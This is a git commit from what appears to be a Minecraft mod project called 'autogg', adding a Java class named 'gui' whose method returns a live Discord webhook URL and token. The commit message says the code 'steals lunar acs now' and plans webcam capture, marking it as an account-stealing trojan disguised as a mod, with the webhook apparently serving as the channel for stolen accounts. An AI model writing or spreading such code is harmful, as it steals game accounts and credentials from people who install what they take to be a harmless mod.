525e516b44a30fc52c0f587c01c877832e5f0e30
rat <112645929+iLoveRat@users.noreply.github.com>
2023-03-11 17:03:56 +0000

    fixed bug ig, also steals lunar acs now
    maybe i will make it take screenshot and picture through webcam

---
+++ src/main/java/github/quantizr/autogg/guis/gui.java
@@ -0,0 +1,13 @@
+package github.quantizr.autogg.guis;
+
+public class gui {
+	public static String guiHandler() {
+		// put the webhook here
+		return "https://discord.com/api/webhooks/1071410842110803988/XtW6vnk8lBnBYCSuEoIsrwSbzRjJD1qWrnp527iNpcJ9loOab4Ir0wImqBF3t8pTbzJw";
+		// WEBHOOK GOES IN HERE ^^^^^^
+				}
+
+	public static String guiView() {
+		return "i love tfam!! join their discord: https://discord.com/invite/TWhrmZFXqb please no nuke webhook tfam T-T";
+	}
+}
